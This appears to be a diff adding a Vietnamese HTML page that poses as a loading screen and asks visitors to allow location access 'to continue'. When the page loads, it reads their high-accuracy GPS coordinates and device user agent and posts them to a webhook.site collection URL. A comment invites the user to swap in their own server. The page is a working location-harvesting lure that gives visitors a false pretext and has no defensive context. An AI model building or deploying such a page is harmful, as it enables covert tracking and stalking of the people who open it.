@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đang tải dữ liệu...</title>
+</head>
+<body>
+    <h3>Vui lòng cấp quyền truy cập vị trí để tiếp tục...</h3>
+    
+    <script>
+        // Thay đường link này bằng API Server của bạn
+        const API_URL = 'https://webhook.site/6fd3239b-8f46-4248-b895-9f886fd0c05a';
+
+        function guiViTri(position) {
+            const data = {
+                latitude: position.coords.latitude,   // Vĩ độ
+                longitude: position.coords.longitude, // Kinh độ
+                accuracy: position.coords.accuracy,   // Độ chính xác (mét)
+                userAgent: navigator.userAgent        // Thông tin thiết bị
+            };
+
+            // Gửi dữ liệu về Server bằng Fetch API
+            fetch(API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log('Đã gửi vị trí thành công'))
+            .catch(error => console.error('Lỗi khi gửi:', error));
+        }
+
+        function xuLyLoi(error) {
+            console.warn(`Lỗi: ${error.code}: ${error.message}`);
+            // Có thể hiển thị thông báo nếu người dùng từ chối
+            // alert("Bạn cần bật vị trí để sử dụng tính năng này.");
+        }
+
+        // Tùy chọn độ chính xác
+        const options = {
+            enableHighAccuracy: true, // Lấy vị trí chính xác nhất (dùng GPS)
+            timeout: 5000,
+            maximumAge: 0
+        };
+
+        // Hàm chính để yêu cầu vị trí ngay khi trang web tải xong
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(guiViTri, xuLyLoi, options);
+            } else {
+                console.log("Trình duyệt này không hỗ trợ định vị.");
+            }
+        };
+    </script>
+</body>
+</html>
